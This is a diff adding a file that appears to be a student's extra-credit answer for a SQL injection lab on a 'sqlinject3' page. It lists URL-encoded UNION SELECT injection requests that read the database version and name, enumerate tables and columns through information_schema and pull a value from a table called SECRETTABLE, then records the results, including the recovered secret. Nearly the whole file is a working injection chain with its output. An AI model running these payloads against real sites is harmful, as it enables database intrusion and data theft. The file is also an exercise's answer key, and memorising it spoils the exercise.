@@ -1,0 +1,23 @@
+http://permalink.co/sqlinject3/?id=1
+http://permalink.co/sqlinject3/?id=2
+http://permalink.co/sqlinject3/?id=3
+http://permalink.co/sqlinject3/?id=4
+http://permalink.co/sqlinject3/?id=%27+union+all+select+null%2C+null%2C+%40%40version%23
+http://permalink.co/sqlinject3/?id=%27+union+all+select+null%2C+null%2C+database%28%29%23
+http://permalink.co/sqlinject3/?id=%27+union+all+select+null%2C+null%2C+column_name+FROM+information_schema.columns+WHERE+column_name+LIKE+%27%25id%25%27%23
+http://permalink.co/sqlinject3/?id=%27+union+all+select+null%2C+null%2C+table_name+FROM+information_schema.columns+WHERE+column_name+LIKE+%27%25id%25%27%23
+http://permalink.co/sqlinject3/?id=%27+union+all+select+null%2C+null%2C+table_name+FROM+information_schema.columns+WHERE+column_name+LIKE+%27%25id%25%27+limit+1%2C1%23
+http://permalink.co/sqlinject3/?id=%27+union+all+select+null%2C+null%2C+table_name+FROM+information_schema.columns+WHERE+table_name+LIKE+%27a%25%27+limit+0%2C1%23
+http://permalink.co/sqlinject3/?id=%27+union+all+select+null%2C+null%2C+table_name+FROM+information_schema.columns+WHERE+table_name+LIKE+%27b%25%27+limit+0%2C1%23
+http://permalink.co/sqlinject3/?id=%27+union+all+select+null%2C+null%2C+table_name+FROM+information_schema.columns+WHERE+table_name+LIKE+%27f%25%27+limit+0%2C1%23
+http://permalink.co/sqlinject3/?id=%27+union+all+select+null%2C+null%2C+table_name+FROM+information_schema.columns+WHERE+table_name+LIKE+%27f%25%27+limit+38%2C1%23
+http://permalink.co/sqlinject3/?id=%27+union+all+select+null%2C+null%2C+table_name+FROM+information_schema.columns+WHERE+table_name+LIKE+%27i%25%27+limit+132%2C1%23
+http://permalink.co/sqlinject3/?id=%27+union+all+select+null%2C+null%2C+table_name+FROM+information_schema.columns+WHERE+table_name+LIKE+%27s%25%27+limit+30%2C1%23
+http://permalink.co/sqlinject3/?id=%27+union+all+select+null%2C+ordinal_position%2C+column_name+FROM+information_schema.columns+where+table_name%3D%27SECRETTABLE%27+and+ordinal_position%3D1%23
+http://permalink.co/sqlinject3/?id=%27+union+all+select+null%2C+ordinal_position%2C+column_name+FROM+information_schema.columns+where+table_name%3D%27SECRETTABLE%27+and+ordinal_position%3D2%23
+http://permalink.co/sqlinject3/?id=%27+union+all+select+null%2C+id%2C+secret+FROM+SECRETTABLE+limit+1%2C1%23
+
+Name: proj2_xtra_cr3dit
+Version: 5.5.44-0ubuntu0.14.04.1
+Tables: foo,inject3_users,SECRETTABLE
+Secret: hunter2
